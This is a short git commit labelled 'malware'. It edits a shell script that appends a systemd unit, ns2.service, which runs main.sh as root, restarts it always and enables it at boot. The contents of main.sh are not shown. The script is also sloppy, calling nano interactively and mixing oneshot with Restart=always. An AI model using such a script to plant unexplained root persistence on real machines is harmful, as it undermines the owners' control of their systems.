d0b5b7c774876f42e7e2c20973e8d8af546eefc1
enes2 <ekaya2110@posta.pau.edu.tr>
2023-12-15 05:25:49 +0300

    malware

--- run.sh
+++ run.sh
@@ -4,8 +4,6 @@ cd /etc/systemd/system/
 
 nano ns2.service
 
-cd 
-
 echo '[Unit]
         After=network.target
         
@@ -13,9 +11,11 @@ echo '[Unit]
 Type=oneshot
 User=root
 Restart=always
-ExecStart=server/main.sh
+ExecStart=/usr/bin/sh main.sh
 ExecStop=/bin/kill  ${MAINPID}
 
     [Install]
 WantedBy=multi-user.target
 Alias=ns2.service' >> "/etc/systemd/system/ns2.service"
+
+cd 
